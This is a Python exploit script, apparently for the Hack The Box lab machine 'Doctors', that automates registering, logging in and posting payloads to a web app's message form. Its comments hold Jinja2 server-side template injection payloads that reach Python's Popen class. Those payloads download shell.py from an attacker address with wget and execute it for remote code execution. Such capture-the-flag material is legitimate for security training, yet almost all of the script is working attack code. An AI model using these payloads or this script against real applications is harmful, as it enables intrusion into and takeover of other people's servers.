from html.parser import HTMLParser
from pprint import pprint

import random
import requests
import string

sess = requests.session()
h = HTMLParser()

url = "http://doctors.htb:80"
resp = sess.get(url)

# proxies if we want to go through Burp suite
proxies = {
	'http': 'http://127.0.0.1:8080',
	'https': 'https://127.0.0.1:8080'
}

# These are the payloads, basically check the first three to see which of them comtains Popen class, and run it using the next two
# we need to figure out the number - 407 - from the output, I've got it by doing a binary search approach fairly easily 
# {{ ''.__class__.__mro__[0].__subclasses__() }}
# {{ ''.__class__.__mro__[1].__subclasses__() }}
# {{ ''.__class__.__mro__[2].__subclasses__() }}
# {{ ''.__class__.__mro__[1].__subclasses__()[407]('wget 10.10.14.34:81/shell.py -O /tmp/shell.py',shell=True,stdout=-1).communicate()[0].strip() }}
# {{ ''.__class__.__mro__[1].__subclasses__()[407]('python3 /tmp/shell.py',shell=True,stdout=-1).communicate()[0].strip() }}

# random name each time beacause of the nature of the box and how it expires
name = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
def register():
	data = {
		"username": name,
		"email": f"{name}@doctors.htb",
		"password": "1234",
		"confirm_password": "1234",
		"submit": "Sign Up"
	}
	resp = sess.post(f"{url}/register", data=data)
	return resp.text

# login with the registered user
def login():
	data = {
		"email": f"{name}@doctors.htb",
		"password": "1234",
		"submit": "Login"
	}
	resp = sess.post(f"{url}/login?next=home", data = data)
	return resp.text

# this is where the output of our payload comes
def get_archive():
	resp = sess.get(f"{url}/archive")
	pprint((resp.text))

# post the payload
def post_message():
	print("Post your payload and get response")
	payload = input()
	data = {
		"title": payload,
		"content": payload,
		"submit": "Post",
	}
	resp = sess.post(f"{url}/post/new", data = data)
	if "Your post has been created!" in resp.text:
		print("Posted message")
		get_archive()
	else:
		print("somehting wrong")

resp_login = login()

if "/post/new" in resp_login:
	print("Logged in")
	post_message()
else:
	print("signing up")
	resp = register()
	if "Your account has been created" not in resp:
		print("Something went wrong!")
	else:
		print("registered")
		login()
		post_message()
